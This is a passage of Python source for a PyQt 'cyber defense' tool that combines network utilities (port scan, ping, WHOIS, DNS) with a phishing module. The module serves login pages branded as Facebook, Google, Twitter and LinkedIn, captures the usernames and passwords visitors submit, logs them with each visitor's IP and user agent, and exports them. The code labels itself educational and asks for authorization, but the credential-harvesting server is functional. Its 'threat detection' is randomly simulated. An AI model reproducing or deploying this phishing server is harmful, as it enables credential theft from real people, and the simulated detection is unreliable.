        self.network_info = QPlainTextEdit()
        self.network_info.setReadOnly(True)
        net_layout.addRow(self.network_info)
        
        # Update network info
        self.update_network_info()
        
        return widget
    
    def create_menu_bar(self):
        """Create menu bar"""
        menubar = self.menuBar()
        
        # File menu
        file_menu = menubar.addMenu('File')
        
        export_action = QAction('Export Data', self)
        export_action.triggered.connect(self.export_data)
        file_menu.addAction(export_action)
        
        file_menu.addSeparator()
        
        exit_action = QAction('Exit', self)
        exit_action.triggered.connect(self.close)
        file_menu.addAction(exit_action)
        
        # Tools menu
        tools_menu = menubar.addMenu('Tools')
        
        cli_action = QAction('Command Line Mode', self)
        cli_action.triggered.connect(self.open_cli_mode)
        tools_menu.addAction(cli_action)
        
        # Help menu
        help_menu = menubar.addMenu('Help')
        
        about_action = QAction('About', self)
        about_action.triggered.connect(self.show_about)
        help_menu.addAction(about_action)
    
    def load_default_templates(self):
        """Load default phishing templates"""
        self.templates = {
            "Facebook": self.get_facebook_template(),
            "Google": self.get_google_template(),
            "Twitter": self.get_twitter_template(),
            "LinkedIn": self.get_linkedin_template(),
            "Custom": self.get_default_template()
        }
        self.template_editor.setPlainText(self.templates["Facebook"])
    
    def get_default_template(self):
        """Get default template"""
        return """<!DOCTYPE html>
<html>
<head>
    <title>Secure Login</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }
        .login-container { background: white; padding: 20px; border-radius: 5px; max-width: 400px; margin: 100px auto; }
        .form-group { margin-bottom: 15px; }
        input { width: 100%; padding: 10px; margin: 5px 0; }
        button { background: #007bff; color: white; padding: 10px; border: none; width: 100%; }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Secure Login</h2>
        <form method="POST">
            <div class="form-group">
                <input type="text" name="username" placeholder="Username" required>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit">Login</button>
        </form>
        <p style="color: #666; font-size: 12px; margin-top: 20px;">
            Educational Purpose Only - Cybersecurity Awareness
        </p>
    </div>
</body>
</html>"""
    
    def get_facebook_template(self):
        return self.get_default_template().replace("Secure Login", "Facebook").replace("Secure Login", "Facebook Login")
    
    def get_google_template(self):
        return self.get_default_template().replace("Secure Login", "Google").replace("Secure Login", "Google Account")
    
    def get_twitter_template(self):
        return self.get_default_template().replace("Secure Login", "Twitter").replace("Secure Login", "Twitter Login")
    
    def get_linkedin_template(self):
        return self.get_default_template().replace("Secure Login", "LinkedIn").replace("Secure Login", "LinkedIn Login")
    
    def change_template(self, template_name):
        """Change template in editor"""
        if template_name in self.templates:
            self.template_editor.setPlainText(self.templates[template_name])
    
    def start_port_scan(self):
        """Start port scan"""
        ip = self.scan_ip.text()
        ports = self.scan_ports.text()
        
        if not ip:
            QMessageBox.warning(self, "Error", "Please enter an IP address")
            return
        
        self.network_results.appendPlainText(f"🔍 Scanning {ip} on ports {ports}...")
        self.stats['network_scans'] += 1
        self.update_stats()
        
        # Run scan in thread
        def run_scan():
            result = self.scanner.port_scan(ip, ports)
            if result['success']:
                open_ports = result.get('open_ports', [])
                output = f"✅ Scan completed for {ip}\n"
                output += f"Open ports: {len(open_ports)}\n"
                for port in open_ports:
                    output += f"  Port {port['port']}: {port['service']}\n"
            else:
                output = f"❌ Scan failed: {result.get('error', 'Unknown error')}"
            
            self.network_results.appendPlainText(output)
        
        threading.Thread(target=run_scan, daemon=True).start()
    
    def start_ping(self):
        """Start ping"""
        ip, ok = QInputDialog.getText(self, "Ping", "Enter IP address:")
        if ok and ip:
            self.network_results.appendPlainText(f"🏓 Pinging {ip}...")
            result = self.scanner.ping_ip(ip)
            self.network_results.appendPlainText(result)
    
    def start_traceroute(self):
        """Start traceroute"""
        target, ok = QInputDialog.getText(self, "Traceroute", "Enter target IP or domain:")
        if ok and target:
            self.network_results.appendPlainText(f"🛣️ Traceroute to {target}...")
            result = self.scanner.traceroute(target)
            self.network_results.appendPlainText(result)
    
    def get_ip_location(self):
        """Get IP location"""
        ip, ok = QInputDialog.getText(self, "IP Location", "Enter IP address:")
        if ok and ip:
            self.network_results.appendPlainText(f"🌍 Getting location for {ip}...")
            result = self.scanner.get_ip_location(ip)
            self.network_results.appendPlainText(result)
    
    def start_whois(self):
        """Start WHOIS lookup"""
        domain, ok = QInputDialog.getText(self, "WHOIS", "Enter domain:")
        if ok and domain:
            try:
                result = subprocess.run(['whois', domain], capture_output=True, text=True, timeout=30)
                self.network_results.appendPlainText(f"🔍 WHOIS for {domain}:\n{result.stdout[:1000]}...")
            except:
                self.network_results.appendPlainText("❌ WHOIS lookup failed")
    
    def start_dns_lookup(self):
        """Start DNS lookup"""
        domain, ok = QInputDialog.getText(self, "DNS Lookup", "Enter domain:")
        if ok and domain:
            try:
                ip = socket.gethostbyname(domain)
                self.network_results.appendPlainText(f"🌐 {domain} → {ip}")
            except Exception as e:
                self.network_results.appendPlainText(f"❌ DNS lookup failed: {e}")
    
    def start_phishing_server(self):
        """Start phishing server"""
        port = self.phishing_port.value()
        template = self.template_editor.toPlainText()
        redirect_url = self.redirect_url.text()
        
        if not template:
            QMessageBox.warning(self, "Error", "Template cannot be empty")
            return
        
        try:
            # Stop existing server if running
            if str(port) in self.phishing_servers:
                server = self.phishing_servers[str(port)]
                if server.running:
                    server.stop()
                    server.wait()
            
            # Start new server
            server = PhishingServer(port, template, redirect_url, True)
            server.new_credentials.connect(self.handle_new_credentials)
            server.server_status.connect(self.handle_server_status)
            server.visitor_connected.connect(self.handle_visitor)
            server.start()
            
            self.phishing_servers[str(port)] = server
            self.start_phishing_btn.setEnabled(False)
            self.stop_phishing_btn.setEnabled(True)
            
            self.server_log.appendPlainText(f"✅ Phishing server started on port {port}")
            
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Could not start server: {str(e)}")
    
    def stop_phishing_server(self):
        """Stop phishing server"""
        port = self.phishing_port.value()
        if str(port) in self.phishing_servers:
            server = self.phishing_servers[str(port)]
            server.stop()
            server.wait()
            self.start_phishing_btn.setEnabled(True)
            self.stop_phishing_btn.setEnabled(False)
            self.server_log.appendPlainText("🛑 Phishing server stopped")
    
    def handle_new_credentials(self, log_entry, cred_data):
        """Handle new captured credentials"""
        self.credentials_display.appendPlainText(log_entry)
        self.captured_credentials.append(cred_data)
        self.stats['credentials_captured'] += 1
        self.update_stats()
        
        # Log to database
        self.db_manager.log_phishing_result(
            "Phishing Page",
            json.dumps(cred_data),
            cred_data.get('client_ip', 'Unknown'),
            cred_data.get('user_agent', 'Unknown')
        )
    
    def handle_server_status(self, status):
        """Handle server status updates"""
        self.server_log.appendPlainText(f"📡 {status}")
    
    def handle_visitor(self, client_info):
        """Handle visitor connections"""
        self.server_log.appendPlainText(f"👤 {client_info}")
        self.stats['visitors'] += 1
        self.update_stats()
    
    def add_monitored_ip(self):
        """Add IP to monitoring"""
        ip = self.monitor_ip.text()
        if ip:
            try:
                ipaddress.ip_address(ip)
                self.monitored_ips.add(ip)
                self.monitored_list.addItem(ip)
                self.monitor_ip.clear()
                self.save_config()
                self.threat_log.appendPlainText(f"✅ Added {ip} to monitoring")
            except ValueError:
                QMessageBox.warning(self, "Error", "Invalid IP address")
    
    def remove_monitored_ip(self):
        """Remove IP from monitoring"""
        current_item = self.monitored_list.currentItem()
        if current_item:
            ip = current_item.text()
            self.monitored_ips.discard(ip)
            self.monitored_list.takeItem(self.monitored_list.row(current_item))
            self.save_config()
            self.threat_log.appendPlainText(f"✅ Removed {ip} from monitoring")
    
    def update_system_info(self):
        """Update system information"""
        info = f"""OS: {platform.system()} {platform.release()}
CPU Cores: {psutil.cpu_count()}
CPU Usage: {psutil.cpu_percent()}%
Memory: {psutil.virtual_memory().percent}%
Disk: {psutil.disk_usage('/').percent}%
Boot Time: {datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M')}
Processes: {len(psutil.pids())}"""
        
        self.system_info.setPlainText(info)
    
    def update_network_info(self):
        """Update network information"""
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        info = f"""Hostname: {hostname}
Local IP: {local_ip}
Network Connections: {len(psutil.net_connections())}
Network Interfaces: {len(psutil.net_if_addrs())}"""
        
        self.network_info.setPlainText(info)
    
    def update_stats(self):
        """Update statistics display"""
        for key, label in self.stats_labels.items():
            label.setText(str(self.stats[key]))
    
    def start_background_monitoring(self):
        """Start background monitoring"""
        self.monitor_timer = QTimer()
        self.monitor_timer.timeout.connect(self.background_monitoring)
        self.monitor_timer.start(10000)  # 10 seconds
    
    def background_monitoring(self):
        """Background monitoring tasks"""
        self.update_system_info()
        self.update_network_info()
        
        # Simulate threat detection for demo
        if random.random() < 0.1:  # 10% chance
            ip = f"192.168.1.{random.randint(1, 255)}"
            self.threat_log.appendPlainText(f"🚨 Suspicious activity detected from {ip}")
            self.db_manager.log_threat(ip, "Suspicious Scan", "Medium", "Port scanning detected")
            self.stats['threats_detected'] += 1
            self.update_stats()
    
    def quick_scan(self):
        """Quick network scan"""
        self.scan_ip.setText("127.0.0.1")
        self.start_port_scan()
    
    def quick_start_phishing(self):
        """Quick start phishing server"""
        self.start_phishing_server()
    
    def quick_generate_report(self):
        """Quick generate report"""
        self.generate_report()
    
    def quick_check_threats(self):
        """Quick check threats"""
        threats = self.db_manager.get_recent_threats(5)
        if threats:
            self.threat_log.appendPlainText("🚨 Recent Threats:")
            for ip, ttype, severity, ts in threats:
                self.threat_log.appendPlainText(f"  • {ip} - {ttype} ({severity})")
        else:
            self.threat_log.appendPlainText("✅ No recent threats")
    
    def generate_report(self):
        """Generate security report"""
        threats = self.db_manager.get_recent_threats(50)
        phishing_results = self.db_manager.get_phishing_results(50)
        
        report = {
            'generated_at': datetime.now().isoformat(),
            'statistics': self.stats,
            'monitored_ips': list(self.monitored_ips),
            'recent_threats': len(threats),
            'captured_credentials': len(phishing_results),
            'system_info': {
                'os': f"{platform.system()} {platform.release()}",
                'cpu_cores': psutil.cpu_count(),
                'memory_usage': f"{psutil.virtual_memory().percent}%",
                'disk_usage': f"{psutil.disk_usage('/').percent}%"
            }
        }
        
        filename = f"security_report_{int(time.time())}.json"
        os.makedirs(REPORT_DIR, exist_ok=True)
        filepath = os.path.join(REPORT_DIR, filename)
        
        with open(filepath, 'w') as f:
            json.dump(report, f, indent=2)
        
        QMessageBox.information(self, "Report Generated", f"Security report saved as: {filename}")
    
    def export_data(self):
        """Export all data"""
        file_path, _ = QFileDialog.getSaveFileName(self, "Export Data", "cybersecurity_data.json", "JSON Files (*.json)")
        if file_path:
            data = {
                'monitored_ips': list(self.monitored_ips),
                'captured_credentials': self.captured_credentials,
                'statistics': self.stats,
                'export_time': datetime.now().isoformat()
            }
            
            with open(file_path, 'w') as f:
                json.dump(data, f, indent=2)
            
            QMessageBox.information(self, "Export Successful", "All data exported successfully!")
    
    def open_cli_mode(self):
        """Open command-line mode"""
        self.hide()
        cli = CommandLineInterface(self)
        result = cli.run()
        if result == 'gui':
            self.show()
        else:
            self.close()
    
    def show_about(self):
        """Show about dialog"""
        QMessageBox.about(self, "About Accurate Cyber Defense Tool",
            "<h3>Accurate Cyber Defense - Multi-Mode Security Tool</h3>"
            "<p><b>Version:</b> 2.0</p>"
            "<p><b>Features:</b></p>"
            "<ul>"
            "<li>Network Security Scanning</li>"
            "<li>Phishing Awareness Training</li>"
            "<li>Real-time Monitoring</li>"
            "<li>Threat Detection</li>"
            "<li>Dual Interface (GUI + CLI)</li>"
            "</ul>"
            "<p><b>⚠️ Educational Use Only</b></p>"
            "<p>Always obtain proper authorization before testing.</p>")
    
    def load_settings(self):
        """Load settings"""
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                    self.monitored_ips = set(config.get('monitored_ips', []))
                    
                    # Update monitored list
                    for ip in self.monitored_ips:
                        self.monitored_list.addItem(ip)
        except Exception as e:
            print(f"Settings load error: {e}")
    
    def save_config(self):
        """Save configuration"""
        try:
            config = {
                'monitored_ips': list(self.monitored_ips)
            }
            with open(CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
        except Exception as e:
            print(f"Config save error: {e}")
    
    def closeEvent(self, event):
        """Handle application close"""
        # Stop all phishing servers
        for server in self.phishing_servers.values():
            if server.running:
                server.stop()
                server.wait()
        event.accept()

def main():
    """Main application entry point"""
    app = QApplication(sys.argv)
    
    # Set application properties
    app.setApplicationName("Accurate Cyber Defense Tool")
    app.setApplicationVersion("2.0")
    app.setOrganizationName("Accurate Cyber Defense")
    
    # Display educational disclaimer
    reply = QMessageBox.question(None, "⚠️ EDUCATIONAL USE ONLY ⚠️", 
        "ACCURATE CYBER DEFENSE - SECURITY TOOL\n\n"
        "This tool is designed for:\n"
        "• Security education and awareness training\n"
        "• Authorized penetration testing\n"
        "• Cybersecurity research\n\n"
        "⚠️ LEGAL AND ETHICAL USE ONLY ⚠️\n"
        "• Never use without explicit authorization\n"
        "• Respect privacy and applicable laws\n"
        "• Use only on systems you own or have permission to test\n\n"
        "Choose interface mode:",
        QMessageBox.Yes | QMessageBox.No | QMessageBox.Cancel,
        QMessageBox.Yes)
    
    if reply == QMessageBox.Cancel:
        sys.exit(0)
    elif reply == QMessageBox.Yes:
        # GUI Mode
        window = AccurateCyberDefenseTool()
        window.show()
        sys.exit(app.exec_())
    else:
        # CLI Mode
        main_app = AccurateCyberDefenseTool()
        cli = CommandLineInterface(main_app)
        cli.run()

if __name__ == "__main__":
    main()